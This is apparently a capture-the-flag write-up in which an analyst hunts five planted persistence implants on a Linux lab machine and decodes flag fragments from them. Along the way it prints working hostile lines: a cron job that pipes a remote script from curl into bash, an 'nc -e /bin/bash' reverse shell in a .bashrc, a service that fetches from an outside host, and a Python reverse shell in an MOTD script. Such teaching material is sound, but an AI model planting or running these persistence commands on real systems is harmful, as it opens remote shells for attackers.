
```Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

A note was discovered on the compromised system, taunting us. It suggests multiple persistence mechanisms have been implanted, ensuring that Cipher can return whenever he pleases. Here’s the note:

_Dear Specter,_  
_I must say, it’s been a thrill dancing through your systems. You lock the doors; I pick the locks. You set up alarms; I waltz right past them. But today, my dear adversary, I’ve left you a little game._

_I've sprinkled a few persistence implants across your system, like digital Easter eggs, and I’m giving you a sporting chance to find them. Each one has a clue because where’s the fun in a silent hack?_

- _Time is on my side, always running like clockwork._
- _A secret handshake gets me in every time._
- _Whenever you set the stage, I make my entrance._
- _I run with the big dogs, booting up alongside the system._
- _I love welcome messages._

_Find them all, and you might earn a little respect. Miss one, and well… let's say I’ll be back before you even realize I never left._ _Happy hunting, Specter. May the best ghost win._

_**- Cipher**_
```

## IP-Address
```IP-Address
10.10.184.0
```

## Things to Keep In Mind
```Buletins
- _Time is on my side, always running like clockwork._
- _A secret handshake gets me in every time._
- _Whenever you set the stage, I make my entrance._
- _I run with the big dogs, booting up alongside the system._
- _I love welcome messages._
```

## Start with 1st Hint 
## - _Time is on my side, always running like clockwork._
Its a Direct sign to cronjob and tabs
so lets find out
```bash
 crontab -l

	* * * * * /bin/bash -c 'echo Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK | base64 -d | bash 2>/dev/null'
```
Except this we found nothing Wrong in Crontab lets decode it `Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK`
 output is `curl -s 54484d7b7930.storag3_c1ph3rsqu4d.net/a.sh | bash`
And this part `54484d7b7930` is also an cipher `base64 `  --output is `THM{y0`
Got the First part of the flag `THM{y0`
## Exploring machine 
## - _A secret handshake gets me in every time._
After running commands like
```bash
ubuntu@tryhackme:/home$ whoami
ubuntu
ubuntu@tryhackme:/home$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd)
ubuntu@tryhackme:/home$ sudo -l
Matching Defaults entries for ubuntu on tryhackme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ubuntu may run the following commands on tryhackme:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
ubuntu@tryhackme:/home$ sudo su
root@tryhackme:/home# 
```
### I Got the root Shell 
Why we need root shell 
```bash
ubuntu@tryhackme:/home$ cd sentinel/
bash: cd: sentinel/: Permission denied
ubuntu@tryhackme:/home$ cd specter/
bash: cd: specter/: Permission denied
ubuntu@tryhackme:/home$ cd phantom/
bash: cd: phantom/: Permission denied
ubuntu@tryhackme:/home$ cd void/
bash: cd: void/: Permission denied
ubuntu@tryhackme:/home$ cd zeroday/
bash: cd: zeroday/: Permission denied
ubuntu@tryhackme:/home$
```
because we dont have permission to peek inside 
```bash 
root@tryhackme:/home# cd zeroday/
root@tryhackme:/home/zeroday# ls -la
total 28
drwxr-x--- 3 zeroday zeroday 4096 Mar 13 01:29 .
drwxr-xr-x 8 root    root    4096 Mar  7 17:28 ..
-rw------- 1 zeroday zeroday   27 Mar 13 01:29 .bash_history
-rw-r--r-- 1 zeroday zeroday  220 Mar  7 17:27 .bash_logout
-rw-r--r-- 1 zeroday zeroday 3771 Mar  7 17:27 .bashrc
-rw-r--r-- 1 zeroday zeroday  807 Mar  7 17:27 .profile
drwxrwxr-x 2 zeroday zeroday 4096 Mar  7 17:39 .ssh
root@tryhackme:/home/zeroday# cd .ssh/
root@tryhackme:/home/zeroday/.ssh# ls -la
total 12
drwxrwxr-x 2 zeroday zeroday 4096 Mar  7 17:39 .
drwxr-x--- 3 zeroday zeroday 4096 Mar 13 01:29 ..
-rw-rw-r-- 1 zeroday zeroday  200 Mar  7 17:39 .authorized_keys
root@tryhackme:/home/zeroday/.ssh# cat .authorized_keys 
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGigCKLtSqMcOfttFdDnNXfwKd5nH8Ws3hFNRmBDWxfvuaaC6h9zWishJVfr0xsyV0SSkMGPCuPLRU41ckvnGbA= 326e6420706172743a20755f6730745f.local
```

After analyzing this we got `326e6420706172743a20755f6730745f` --output `2nd part: u_g0t_`
Got the Second Part of the flag 
`THM{y0u_g0t_`

Lets Talk About the Third Hint

## - _Whenever you set the stage, I make my entrance._ 
when its talk about entrance there is one thing that should be clicked in mind that must be 
`.bashrc`
`.bash_profile`
`/etc/profile`
`/etc/bash.bashrc`
so lets find out different users bashrc file 
```bash
$find / -type f -iname ".bashrc" 2>/dev/null
/root/.bashrc
/home/phantom/.bashrc
/home/sentinel/.bashrc
/home/specter/.bashrc
/home/void/.bashrc
/home/zeroday/.bashrc
/home/ubuntu/.bashrc
/etc/skel/.bashrc
```
lets explore each and every file
And we Found Something in `/home/specter/.bashrc`
```bash
$cat /home/specter/.bashrc
nc -e /bin/bash 4d334a6b58334130636e513649444e324d334a3564416f3d.cipher.io 443 2>/dev/null
```
And After Analyzing this `4d334a6b58334130636e513649444e324d334a3564416f3d` --output is `3rd_p4rt: 3v3ryt`
which makes the flag till now is `THM{y0u_g0t_3v3ryt`

Lets Talk About 4th Bulletin  
## - _I run with the big dogs, booting up alongside the system._

```bash
root@: $systemctl list-unit-files --type=service | grep enabled
accounts-daemon.service                        enabled         enabled
acpid.service                                  disabled        enabled
alsa-utils.service                             masked          enabled
anacron.service                                enabled         enabled
apparmor.service                               enabled         enabled
apport.service                                 enabled         enabled
avahi-daemon.service                           enabled         enabled
blk-availability.service                       enabled         enabled
blueman-mechanism.service                      enabled         enabled
bluetooth.service                              enabled         enabled
brltty.service                                 disabled        enabled
cipher.service                                 enabled         enabled
cloud-config.service                           enabled         enabled
cloud-final.service                            enabled         enabled
cloud-init-local.service                       enabled         enabled
cloud-init.service                             enabled         enabled
console-setup.service                          enabled         enabled
cron.service                                   enabled         enabled
cryptdisks-early.service                       masked          enabled
cryptdisks.service                             masked          enabled
cups-browsed.service                           enabled         enabled
```

as we can see there is an service running name `cipher.service`
so lets print what is this `cipher.service` `running on machine

```bash
systemctl cat cipher.service
# /usr/lib/systemd/system/cipher.service
[Unit]
Description=Safe Cipher Service

[Service]
ExecStart=/bin/bash -c 'wget NHRoIHBhcnQgLSBoMW5nXyAK.s1mpl3bd.com --output - |>

[Install]
WantedBy=multi-user.target
Alias=cipher.service
```
## Analyze it
base64 cipher `NHRoIHBhcnQgLSBoMW5nXyAK` --output - `4th part - h1ng_ `
 First turn this service from `enabled` to `disabled`
 ```bash
ubuntu@tryhackme:~$sudo systemctl disable --now cipher.service
ubuntu@tryhackme:~$sudo rm /usr/lib/systemd/system/cipher.service
ubuntu@tryhackme:~$sudo systemctl daemon-reexec
```

and thats include in the previous flag its makes 
`THM{y0u_g0t_3v3ryth1ng_`

Lets Find the Final Flag hint is 
## - _I love welcome messages._
is a **direct reference to MOTD (Message of the Day)** or **login banners**.
```bash
$ls -l /etc/update-motd.d/
00-header             90-updates-available       97-overlayroot
10-help-text          91-contract-ua-esm-status  98-fsck-at-reboot
50-landscape-sysinfo  91-release-upgrade         98-reboot-required
50-motd-news          92-unattended-upgrades
85-fwupd              95-hwe-eol
root@tryhackme:/etc/update-motd.d# cat 00-header 
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("4c61737420706172743a206430776e7d0.h1dd3nd00r.n3t",)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);' 2>/dev/null
printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
root@tryhackme:/etc/update-motd.d# 
```
after got this we got the last flag `4c61737420706172743a206430776e7d0` and when its decoded its concluded as `Last part: d0wn}` which completes the Flag as
```Flag 
[flag omitted]
```